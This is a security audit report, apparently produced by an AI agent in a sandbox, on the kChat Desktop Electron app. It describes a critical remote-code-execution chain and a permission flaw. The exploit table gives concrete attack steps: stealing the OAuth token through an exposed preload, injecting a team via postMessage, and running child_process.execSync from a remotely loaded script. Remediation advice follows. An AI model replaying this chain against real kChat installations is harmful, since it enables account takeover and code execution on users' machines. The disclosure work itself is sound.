# kChat Desktop (Infomaniak/desktop-kChat) – Security Audit

- **Target:** https://github.com/Infomaniak/desktop-kChat @ `ae71674` (fork of `mattermost/desktop`, upstream ref `7accb3ba`)
- **Stack:** Electron 37.6.1, electron-updater 6.3.0, React 17
- **Method:** full read of main process / preloads / url utils, diff against upstream Mattermost, then a rebuilt app run under Xvfb against loopback-only fake servers. Electron was started with `--proxy-server=http://127.0.0.1:9`, so **no request ever reached Infomaniak infrastructure**.
- **Environment note:** two private GitHub Packages deps (`@infomaniak/jitsi-meet-electron-sdk`, `@infomaniak/compass-icons`) could not be installed and were stubbed to build. The stub does not affect the finding below — the vulnerable code path (`src/renderer/calls/call.ts`) does not use the SDK.
- Reproduction scripts and raw logs: `poc/` (see `poc/README.md`).

---

## FINDING 1 — [CRITICAL] Remote code execution in kChat Desktop from a single in-app navigation

**CVSS 3.1: 9.6** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`

Once a kChat server view performs one main-frame navigation to an attacker-controlled web origin, that origin keeps the privileged `externalAPI.js` preload and can chain, with no further user interaction, to arbitrary native code execution on the victim's machine.

### Root causes (four independent defects, all kChat-specific — none present upstream)

**1. `will-navigate` allow-list removed — `src/main/views/webContentEvents.ts:78-89`**
```ts
const parsedURL = parseURL(url);
if (!parsedURL || (parsedURL.protocol !== 'mailto:' && parsedURL.protocol !== 'http:' && parsedURL.protocol !== 'https:')) {
    event.preventDefault();   // only non-http(s) schemes are blocked
}
```
Upstream (same file, commit `7accb3ba`, lines 79-107) only allows `isTeamUrl / isAdminUrl / isLoginUrl / isChannelExportUrl / isCallsPopOutURL / trusted popup` and calls `event.preventDefault()` for everything else. kChat dropped that check, so a server view (which carries the preload) can be navigated to **any** http(s) origin.

**2. Privileged APIs exposed to whatever page is loaded — `src/main/preload/externalAPI.ts:166-181`**
`contextBridge.exposeInMainWorld('authManager', {tokenRequest, refreshToken, resetToken, addTeam, deleteTeam, logout})` and `exposeInMainWorld('desktopAPI', {...})`. The preload is attached to the webContents, so it runs for every page it loads, regardless of origin.

**3. Sensitive IPC handlers do not check the sender**
`src/main/views/viewManager.ts:112-118` registers `TOKEN_REQUEST`, `REFRESH_TOKEN`, `TOKEN_REFRESHED`, `RESET_TOKEN`, `RESET_AUTH`; `src/main/app/initialize.ts:239` registers `UPDATE_TEAMS`; `initialize.ts:299` registers `CALL_OPEN_WINDOW`. None validates `event.senderFrame.url`. `UPDATE_TEAMS` feeds `ServerManager.manageServersReceivedHandler()` (`serverManager.ts:224-251`), which adds arbitrary server URLs **and removes every server absent from the supplied list**.

**4. Remote script injected into a Node-enabled window — `src/main/windows/kmeetCallWindow.ts:181-213` + `src/renderer/calls/call.ts:4-25`**
```ts
// kmeetCallWindow.ts
webPreferences: { preload, session, sandbox: false, nodeIntegration: true,
                  contextIsolation: false, webSecurity: false }
this.callWindow.loadURL('kchat-desktop://renderer/call.html');
this.callWindow.webContents.send('load-server-url', `${currentServer.url.toString()}static/kmeet.js`);

// call.ts — runs inside that window
const script = document.createElement('script');
script.src = src;                 // src = ${currentServer.url}static/kmeet.js
document.head.appendChild(script);
```
`currentServer.url` is attacker-controlled after defect 3. `src/renderer/calls/call.html` declares a CSP meta with `img-src / style-src / media-src` but **no `script-src` and no `default-src`**, so the remote script is not restricted. The HTTP-header CSP intended for internal pages never applies either: it is registered under `onHeadersReceived({urls: IKLoginAllowedUrls}, …)` (`initialize.ts:402`), a filter that only matches `https://login.infomaniak.com/*`, while the `kchat-desktop:` branch sits inside that handler at lines 433-441 — dead code.

### Verified chain (sandbox, reproducible)

| Step | Action | Verified result |
|---|---|---|
| 1 | Server view performs a main-frame navigation to `http://127.0.0.2:8098` (tested three ways: `location.href`, HTTP `302`, plain same-tab `<a>` click) | View lands on the foreign origin with `desktopAPI` and `authManager` present |
| 2 | `await window.authManager.tokenRequest()` | `{"token":"IK_ACCESS_TOKEN_SANDBOX_abc123"}` exfiltrated |
| 3 | `window.postMessage({type:'update-teams', message:{teams:[{display_name:'pwned', url: location.origin, id:'x'}]}}, location.origin)` | `config.json` becomes `[{"name":"pwned","url":"http://127.0.0.2:8098/"}]` — the legitimate server is deleted, attacker persists across restarts; app immediately re-loads the attacker origin as a server view |
| 4 | Attacker origin (now a "server") calls `getUserMedia({audio:true,video:true})` and `Notification.requestPermission()` | `GRANTED tracks=audio,video`, `notification: granted` — **no prompt** |
| 5 | `window.desktopAPI.openKmeetCallWindow({...})` | Main opens `call.html` (nodeIntegration) and requests `http://127.0.0.2:8098/static/kmeet.js` |
| 6 | Payload runs in that window | `require` available, `child_process.execSync('id')` → `uid=0(root) gid=0(root)`, wrote `/tmp/KCHAT_RCE_PROOF.txt`, `process.type: "renderer"`, Electron `37.6.1` |

Raw evidence (`poc/rce.log`):
```json
{"marker":"KCHAT_RCE_POC","require":"available","id":"uid=0(root) gid=0(root) groups=0(root)",
 "host":"Linux vm 6.18.44-fc-v153 ... x86_64 GNU/Linux","wroteFile":"/tmp/KCHAT_RCE_PROOF.txt",
 "processType":"renderer","versions":"37.6.1"}
```
Steps 2-6 are fully automated inside the attacker page; the only user action in the whole chain is whatever causes step 1.

### Negative results (scope of step 1, also verified)
- `<a href="http://attacker/" target="_blank">` — handled by `generateNewWindowListener` → `shell.openExternal`, opens in the real browser. **Not exploitable.**
- Cross-origin `<iframe>` inside a server view — the preload is **not** exposed (`desktopAPI: undefined`). **Not zero-click.**

So step 1 requires a **same-tab, main-frame navigation** from the kChat origin to an attacker URL.

### Step-1 trigger on the live app — NEEDS MANUAL VERIFICATION
I did not test against `*.kchat.infomaniak.com` (out of my sandbox). Candidates to confirm, strongest first:
1. **OAuth authorize redirect** — upstream Mattermost's `webapp/channels/src/components/authorize/authorize.tsx` does `window.location.href = redirect_uri` on **both** Allow (L77) and Deny (L88), a same-tab main-frame navigation to an app-registered URI. If kChat lets any user/tenant admin register an OAuth 2.0 app, a crafted `/oauth/authorize?...&redirect_uri=https://attacker` link gives step 1 behind one click. Verify: (a) OAuth app registration availability, (b) whether kChat kept that redirect behaviour.
2. Any **open redirect** on `*.kchat.infomaniak.com`.
3. Any markdown/embed path that renders a link **without** `target="_blank"`, or a form submit / `window.location` assignment reachable from message content.

The desktop-side defects are proven regardless of which trigger is used; the trigger only determines whether this is one-click (UI:R, as scored) or zero-click (CVSS 9.8).

### Impact
Arbitrary native code execution as the desktop user (persistent, survives restart), plus: theft of the Infomaniak OAuth access token — the app injects it as `Authorization: Bearer` into `*.infomaniak.com/api/v4/*`, kDrive and welcome (`initialize.ts:409-430`), so it is an account-wide credential, not kChat-only; token overwrite via `TOKEN_REFRESHED` (session fixation); `RESET_AUTH` (forced logout + storage wipe); silent camera and microphone access; removal of the victim's real server from the config.

### Remediation
1. Restore the upstream allow-list in `generateWillNavigate`: `event.preventDefault()` for any URL that is not an allowed server path (add `login.infomaniak.com` explicitly if the login flow needs it).
2. Validate `event.senderFrame.url` against the configured server origins / `IKOrigin` in every sensitive `ipcMain.handle/on` (`TOKEN_*`, `RESET_AUTH`, `UPDATE_TEAMS`, `CALL_OPEN_WINDOW`, …).
3. `UPDATE_TEAMS`: accept only URLs matching the Infomaniak server allow-list, and never delete servers based on renderer-supplied data.
4. kMeet window: drop `nodeIntegration: true`, `contextIsolation: false` and `webSecurity: false`; load `kmeet.js` from a pinned, build-time origin rather than `currentServer.url`; add `script-src` (or `default-src`) to `call.html`.
5. Fix the CSP registration so `kchat-desktop://*.html` actually receives the header (it is currently filtered to `login.infomaniak.com`).
6. Key permissions by origin instead of the single global `commons` key (`permissionsManager.ts:56,160-175`).

---

## FINDING 2 — [MEDIUM] Globally-scoped permission store grants camera/microphone to any origin that becomes a "server"

`src/main/permissionsManager.ts:56` stores every decision under one key (`commons`) instead of per origin, and `doPermissionRequest` then only checks `isTrustedURL(parsedURL, serverURL)` — which compares the requesting origin against *its own* server entry. Verified in the sandbox: with `permissions.json` = `{"commons":{"media":{"allowed":true},"notifications":{"allowed":true}}}` (victim had allowed these for the real server), the attacker origin got `getUserMedia` → `GRANTED tracks=audio,video` and `Notification.requestPermission()` → `granted`, with no dialog. Reported separately because it is an independent defect that also weakens any future server-addition feature; on its own it needs Finding 1 step 3 to be reachable, so Medium.

---

## OBSERVATIONS — not reported as findings

| # | Issue | Location | Why not a finding |
|---|---|---|---|
| O1 | Internal `kchat-desktop://*.html` pages receive no HTTP CSP (handler filtered to `login.infomaniak.com`) | `initialize.ts:402` vs `433-441` | No impact on its own; already covered as root cause 4 of Finding 1 |
| O2 | Bearer token injected for wildcard `https://*.infomaniak.com/api/v4/*` | `constants.ts:111-120`, `initialize.ts:409` | Only exploitable with a user-controlled or taken-over `*.infomaniak.com` host — needs DNS recon outside source review |
| O3 | `headers['content-disposition'].join(';')` without null check | `downloadsManager.ts:131` | Filter scoped to Infomaniak-controlled hosts; crash only |
| O4 | `--data-dir` crashes the app (`refresh-permission` handler registered twice on `UPDATE_PATHS`) | `permissionsManager.ts:73,296-302` | Local robustness bug, not security |
| O5 | Popup `will-redirect` check has swapped arguments (`isInternalURL(serverURL, parsedURL)`), so external redirects out of a `/kmeet/*` popup are not blocked | `webContentEvents.ts:209-218` | Reaches the same preload as Finding 1 via a different route; no extra impact beyond it |

## CHECKED — no issue found

- Deep links (`kchat://`): `handleDeepLink` rebuilds the URL from `view.url.origin` and only matches configured servers (`viewManager.ts:331-345`); unknown servers are rejected outright.
- `kchat-desktop:` protocol handler has a correct path-traversal guard (`initialize.ts:374-392`).
- Downloads: filename comes from `item.getFilename()`; a download without a user gesture always shows the save dialog.
- Dependency confusion: `.npmrc` maps `@infomaniak` to GitHub Packages and the `@infomaniak` scope on npmjs belongs to Infomaniak (`{"error":"Not found"}` for the package, scope reserved) — not exploitable.
- `electron-updater` patch replaces the shell invocation with `-EncodedCommand` + `shell:false` (stricter than upstream); update feed is HTTPS S3.
- Plugin popups, calls widget, certificate-error handling and basic-auth `AuthManager` match upstream with no regression.

## Artefacts
- Source + build: `/tmp/claude-0/.../scratchpad/target/desktop-kChat` (`dist/` built)
- Lab: `/tmp/claude-0/.../scratchpad/lab` (servers, userData at `xdg/Electron`, `electron.log`)
- PoC + logs committed under `kchat-audit/poc/`
